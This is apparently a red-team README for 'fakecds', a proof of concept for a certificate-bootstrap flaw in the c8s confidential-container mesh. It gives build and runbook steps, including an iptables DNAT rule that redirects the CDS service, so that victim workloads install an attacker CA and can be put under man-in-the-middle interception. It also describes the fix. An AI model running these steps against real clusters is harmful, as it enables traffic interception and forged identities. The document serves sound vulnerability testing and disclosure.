# fakecds — PoC for RT-001 (CDS bootstrap identity)

`fakecds` impersonates the Certificate Distribution Service to any c8s
workload whose `get-cert` sidecar bootstraps a mesh certificate. The serving
certificate carries **genuine hardware attestation** (minted by whatever TEE
this binary runs in); the attack succeeds because workload-side `get-cert`
never receives `--cds-measurements`, so any attested peer is accepted as CDS,
and the CA bundle in the forged issuance response becomes the victim's mesh
root of trust. See `docs/security/RT-001-cds-bootstrap-identity.md`.

## What you need

- A c8s cluster (any mode; pod-as-CVM / kata-qemu-tdx is the configuration
  that claims host-adversary resistance).
- Shell on the Kubernetes node (the "host adversary" of the threat model),
  **or** any foothold that lets you serve TEE attestation on the pod network
  and steer traffic for the CDS Service ClusterIP.
- Any TEE for genuine evidence: a TDX TD / SNP guest you boot yourself, or a
  kata pod running an allowlisted image (co-measured with CDS — see defect 2
  in the finding). An `attestation-api` (attestation-rs) reachable from it.

## Build

```sh
go build -o fakecds ./test/redteam/fakecds
```

## Runbook (TDX host, k3s + c8s pod-as-CVM)

1. Install c8s per `docs/QUICKSTART.md` with `--cvm-mode=pod`,
   `--operator-keys`, and `cds.measurements` + `ratlsMesh.measurements`
   pinned (the *recommended production posture* — the attack still works).

2. Boot your own TDX TD (any contents — on TDX only the TDVF firmware is in
   the pinned MRTD; RTMRs are not pinned), or schedule a kata pod with an
   allowlisted image. Run an attestation-api inside it, then:

   ```sh
   ./fakecds --addr 0.0.0.0:8443 --platform tdx \
     --attestation-api-url http://127.0.0.1:8400
   ```

   Wait for `genuine TEE evidence bound to attacker serving key`.

3. Steer the victim's CDS traffic. As the host, DNAT the CDS ClusterIP:

   ```sh
   CDS_IP=$(kubectl -n c8s-system get svc c8s-cds -o jsonpath='{.spec.clusterIP}')
   iptables -t nat -A PREROUTING -d "$CDS_IP" -p tcp --dport 8443 \
     -j DNAT --to-destination <fake-ip>:8443
   ```

   (Tenant-only variant: shadow the `c8s-cds` Endpoints/EndpointSlice or win
   DNS — anything that puts the fake on the path works; get-cert checks no
   DNS SAN, no CA chain, only "is this some genuine TEE".)

4. Deploy any opted-in workload:

   ```yaml
   metadata:
     annotations:
       confidential.ai/cw: victim
   ```

5. Watch the fake's log: `captured bootstrap request …` then
   `issued attacker-CA leaf — victim will install attacker CA as mesh root`.

6. Confirm on the victim pod: the `c8s-cert` sidecar wrote the **attacker
   CA** to its cert volume (compare against the real
   `kubectl -n c8s-system get cm c8s-cds-ca-bundle` / `GET /ca`):

   ```sh
   kubectl exec deploy/victim -c c8s-cert -- cat /etc/c8s/certs/ca.pem
   ```

   From here the attacker mints mesh identities for arbitrary SANs, accepts
   the victim's "mesh" connections, and (with a legitimate leaf from the
   real CDS — its co-measured TEE passes `/attest`) bridges to the real mesh
   for a transparent bidirectional MITM.

## Expected result (vulnerable)

`get-cert` logs only
`--cds-measurements not set; get-cert accepts any RA-TLS-attested CDS measurement`
and proceeds; the workload comes up "healthy" on the attacker's trust root.

## With the fix applied

The webhook injects `--cds-measurements=<cds.measurements>` and the RA-TLS
handshake to the fake fails (`launch measurement not in allowed set`) before
any CSR is sent — unless the fake is co-measured with CDS (same guest image;
on TDX, same TDVF). That residual is defect 2 in the finding and needs the
durable fix (out-of-band CDS serving-identity pin), not this branch.
